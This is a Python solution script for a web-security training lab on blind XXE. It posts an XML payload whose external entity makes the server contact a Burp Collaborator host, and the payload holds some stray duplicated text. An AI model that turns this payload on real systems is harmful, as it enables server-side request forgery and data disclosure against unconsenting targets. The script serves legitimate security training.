##############################################################################
#
# Lab: Blind XXE with out-of-band interaction
#
# Hack Steps:
#      1. Use an external entity to issue a DNS lookup to burp collaborator
#      2. Check your burp collaborator for the DNS lookup
#
##############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a03002703f38e558326731700f40000.web-security-academy.net"

# Change this to your burp collaborator
BURP_COLLABORATOR = "020hy3fcc640duqxsjx0an7rtiz9nzbo.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "productId")
    print(Fore.WHITE + "❯❯ Using an external entity to issue a DNS lookup to burp collaborator.. ", end="", flush=True)

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{BURP_COLLABORATOR}">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""
    headers = { "Content-Type": "application/xml" }
    
    try:
        requests.post(f"{LAB_URL}/product/stock", data=payload, headers=headers)
    
    except:
        print(Fore.RED + "⦗!⦘ Failed to check stock with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
